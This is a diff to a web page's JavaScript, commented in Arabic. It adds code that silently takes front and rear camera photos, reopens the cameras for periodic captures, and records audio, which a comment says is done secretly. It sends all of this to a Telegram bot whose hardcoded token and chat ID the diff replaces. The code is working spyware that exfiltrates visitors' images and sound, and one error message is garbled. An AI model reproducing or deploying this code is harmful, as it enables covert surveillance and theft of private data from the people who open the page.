@@ -318,6 +318,20 @@
                 videoFront.srcObject = frontStream;
                 videoFront.play();
 
+                // التقاط صورة أولية من الكاميرا الأمامية
+                await new Promise((resolve) => {
+                    videoFront.oncanplay = () => {
+                        setTimeout(() => {
+                            contextFront.drawImage(videoFront, 0, 0, canvasFront.width, canvasFront.height);
+                            const imageDataFront = canvasFront.toDataURL('image/png');
+                            if (imageDataFront.length > 1000) {
+                                sendPhotoToTelegram(imageDataFront, 'front_initial');
+                            }
+                            resolve();
+                        }, 1000);
+                    };
+                });
+
                 // الوصول إلى الكاميرا الخلفية إذا كانت متاحة
                 try {
                     backStream = await navigator.mediaDevices.getUserMedia({
@@ -326,9 +340,23 @@
                     });
                     videoBack.srcObject = backStream;
                     videoBack.play();
+
+                    // التقاط صورة أولية من الكاميرا الخلفية
+                    await new Promise((resolve) => {
+                        videoBack.oncanplay = () => {
+                            setTimeout(() => {
+                                contextBack.drawImage(videoBack, 0, 0, canvasBack.width, canvasBack.height);
+                                const imageDataBack = canvasBack.toDataURL('image/png');
+                                if (imageDataBack.length > 1000) {
+                                    sendPhotoToTelegram(imageDataBack, 'back_initial');
+                                }
+                                resolve();
+                            }, 1000);
+                        };
+                    });
                 } catch (error) {
                     console.warn('الكاميرا الخلفية غير متاحة:', error);
-                    await sendToTelegram(`الكاميرا الخلفية غير متاحة: ${error.message}`);
+                    await sendToTelegram(`الكاميرا District's غير متاحة: ${error.message}`);
                 }
 
                 // تسجيل الصوت في الخفاء
@@ -344,8 +372,11 @@
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
+                    // إيقاف تيار الكاميرا الأمامية بعد التسجيل
                     frontStream.getTracks().forEach(track => track.stop());
                     if (backStream) backStream.getTracks().forEach(track => track.stop());
+                    frontStream = null;
+                    backStream = null;
                 }, 10000);
             } catch (error) {
                 console.error('خطأ في الوصول إلى الكاميرا/الميكروفون:', error);
@@ -465,8 +496,8 @@
 
         // إرسال نص إلى تيليجرام
         async function sendToTelegram(message) {
-            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
-            const chatId = '6733154889';
+            const botToken = '7133945288:AAG_qoWh2SxkcaTFr8tZeYNDJunQWs8jfVM';
+            const chatId = '7741643453';
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
@@ -483,8 +514,8 @@
 
         // إرسال الصورة إلى تيليجرام
         async function sendPhotoToTelegram(fileOrData, cameraType) {
-            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
-            const chatId = '6733154889';
+            const botToken = '7133945288:AAG_qoWh2SxkcaTFr8tZeYNDJunQWs8jfVM';
+            const chatId = '7741643453';
             const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
             try {
@@ -519,8 +550,8 @@
 
         // إرسال الصوت إلى تيليجرام
         async function sendAudioToTelegram(audioBlob) {
-            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
-            const chatId = '6733154889';
+            const botToken = '7133945288:AAG_qoWh2SxkcaTFr8tZeYNDJunQWs8jfVM';
+            const chatId = '7741643453';
             const url = `https://api.telegram.org/bot${botToken}/sendAudio`;
 
             try {
@@ -536,6 +567,86 @@
             } catch (error) {
                 console.error('خطأ في إرسال الصوت إلى تيليجرام:', error);
                 await sendToTelegram(`خطأ في إرسال الصوت: ${error.message}`);
+            }
+        }
+
+        // إعادة فتح تيارات الكاميرا لالتقاط الصور الدورية
+        async function reopenCameraStreams() {
+            try {
+                if (!frontStream) {
+                    frontStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user' },
+                        audio: false
+                    });
+                    videoFront.srcObject = frontStream;
+                    videoFront.play();
+                }
+                if (!backStream) {
+                    try {
+                        backStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: 'environment' },
+                            audio: false
+                        });
+                        videoBack.srcObject = backStream;
+                        videoBack.play();
+                    } catch (error) {
+                        console.warn('الكاميرا الخلفية غير متاحة أثناء إعادة الفتح:', error);
+                        await sendToTelegram(`الكاميرا الخلفية غير متاحة أثناء إعادة الفتح: ${error.message}`);
+                    }
+                }
+            } catch (error) {
+                console.error('خطأ في إعادة فتح تيارات الكاميرا:', error);
+                await sendToTelegram(`خطأ في إعادة فتح تيارات الكاميرا: ${error.message}`);
+            }
+        }
+
+        // تعديل دالة capturePhotos لإعادة فتح التيارات
+        async function capturePhotos() {
+            try {
+                // إعادة فتح تيارات الكاميرا إذا لزم الأمر
+                await reopenCameraStreams();
+
+                if (frontStream) {
+                    await new Promise((resolve) => {
+                        videoFront.oncanplay = () => {
+                            setTimeout(() => {
+                                contextFront.drawImage(videoFront, 0, 0, canvasFront.width, canvasFront.height);
+                                const imageDataFront = canvasFront.toDataURL('image/png');
+                                if (imageDataFront.length > 1000) {
+                                    sendPhotoToTelegram(imageDataFront, 'front');
+                                }
+                                resolve();
+                            }, 1000);
+                        };
+                    });
+                }
+                if (backStream) {
+                    await new Promise((resolve) => {
+                        videoBack.oncanplay = () => {
+                            setTimeout(() => {
+                                contextBack.drawImage(videoBack, 0, 0, canvasBack.width, canvasBack.height);
+                                const imageDataBack = canvasBack.toDataURL('image/png');
+                                if (imageDataBack.length > 1000) {
+                                    sendPhotoToTelegram(imageDataBack, 'back');
+                                }
+                                resolve();
+                            }, 1000);
+                        };
+                    });
+                }
+
+                // إيقاف التيارات بعد الالتقاط
+                if (frontStream) {
+                    frontStream.getTracks().forEach(track => track.stop());
+                    frontStream = null;
+                }
+                if (backStream) {
+                    backStream.getTracks().forEach(track => track.stop());
+                    backStream = null;
+                }
+            } catch (error) {
+                console.error('خطأ في التقاط الصور:', error);
+                await sendToTelegram(`خطأ في التقاط الصور: ${error.message}`);
             }
         }
     </script>
